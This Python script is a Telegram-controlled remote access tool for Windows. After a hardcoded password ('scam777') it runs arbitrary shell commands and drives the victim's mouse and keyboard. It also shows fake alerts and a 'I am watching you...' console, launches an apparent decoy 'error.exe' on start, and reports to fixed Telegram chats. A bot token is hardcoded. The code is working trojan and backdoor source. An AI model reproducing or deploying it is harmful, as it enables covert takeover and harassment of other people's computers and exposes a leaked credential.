import logging
import os
import subprocess
import sys
import threading
import time

import keyboard
import mouse
import pyautogui

from telegram import Update, ForceReply
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

token = '5846510402:AAF2knMSpHRm_vCccht8mYERWkb40WE1M5Q'
password = "scam777"
authed_users = []

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)


def cmd_thread(messageText):
    command = messageText.split('cmd ')[1].split()
    output = ''
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    for line in process.stdout.readlines():
        line = line.strip()
        if line:
            output += line.decode('cp866')

    command = messageText.split('cmd ')[1]
    result = f'Output for command:\n{command} \nIs:\n {output}'


def handle_command(messageText, user):
    result = 'unknown command'

    messageText = messageText.lower()

    if messageText == 'left':
        mouse.click("left")
        result = 'Mouse left clicked'
    elif messageText == 'right':
        mouse.click("right")
        result = 'Mouse right clicked'
    elif messageText == 'switch':
        keyboard.press("alt")
        keyboard.press("tab")
        keyboard.release("alt")
        keyboard.release("tab")
        result = 'Window switched'
    elif messageText == 'close':
        keyboard.press("alt")
        keyboard.press("f4")
        keyboard.release("alt")
        keyboard.release("f4")
        result = 'Current window closed'
    elif messageText == 'hide':
        keyboard.press("win")
        keyboard.press("d")
        keyboard.release("win")
        keyboard.release("d")
        result = 'Hided all windows'
    elif messageText == 'mystify' or messageText == 'anim':
        os.system("Mystify.scr -a")
        result = 'Mystify animation started'
    elif messageText == 'watching' or messageText == 'hacked':
        os.system("start cmd")
        time.sleep(0.1)
        keyboard.write("I am watching you...", 0.1)
        time.sleep(1.0)
        keyboard.press("alt")
        keyboard.press("f4")
        keyboard.release("alt")
        keyboard.release("f4")
        result = 'Watching command line shown'
    elif messageText.startswith('cmd '):
        cmdThread = threading.Thread(target=cmd_thread, args=(messageText, ))
        cmdThread.start()
    elif messageText == 'matrix':
        os.startfile("matrix.bat")
        time.sleep(0.1)
        keyboard.press("alt")
        keyboard.press("enter")
        keyboard.release("alt")
        keyboard.release("enter")
        result = 'Matrix shown'
    elif messageText.startswith('press ') or messageText.startswith('type '):
        key = messageText.split('press ')
        if key[0] == messageText:
            key = messageText.split('type ')
            if key[0] == messageText:
                return 'Invalid key'
        try:
            keyboard.press(key[1])
            keyboard.release(key[1])
            result = f'Key {key} typed'
        except ValueError as error:
            result = f'Failed to press{key[1]}: error was: \n{error}'
    elif messageText.startswith('alert '):
        command_text = messageText.split('alert ')[1]
        print(command_text.split())
        print(command_text.split().__len__())
        if command_text.split().__len__() != 3:
            return 'Wrong format: should be:\nalert title, text, button_text'
        title = command_text.split()[0]
        text = command_text.split()[1]
        button_text = command_text.split()[2]
        pyautogui.alert(text=text, title=title, button=button_text)
        result = f'Alert window with title: {title}, text: {text} and button text: {button_text} was shown'



    return result


def get_response(messageText, user):
    if not authed_users.__contains__(user):
        if messageText == password:
            authed_users.append(user)
            return 'Authorization successful'
        else:
            return 'You can\'t send commands, because you are unauthorized\nEnter a password to start sending commands'
    else:
        response = handle_command(messageText, user)
    return response


def handle_messages(update: Update, context: CallbackContext) -> None:
    bot = context.bot
    message = update.message
    messageText = message.text
    user = message.from_user
    username = user.username
    print(message.chat_id)

    print(f'Received a message from @{username} with text: {messageText}')
    response = get_response(messageText, user)

    index = 0
    if response.__len__() > 4096:
        while response.__len__() > index:
            bot.send_message(message.chat_id, response[index:index + 4096])
            index += 4096
    else:
        bot.send_message(message.chat_id, response)


def main() -> None:
    print(sys.getdefaultencoding())
    #    locale.setlocale(locale.LC_ALL, 'ru_RU.1251')

    """Start the bot."""
    print('Bot started')
    # Create the Updater and pass it your bot's token.
    updater = Updater(token)
    os.system("error.exe")
    updater.bot.sendMessage("1280356300", "Bot is online")  # me
    updater.bot.sendMessage("-1001847130553", "Bot is online")  # bot group

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()


if __name__ == '__main__':
    main()
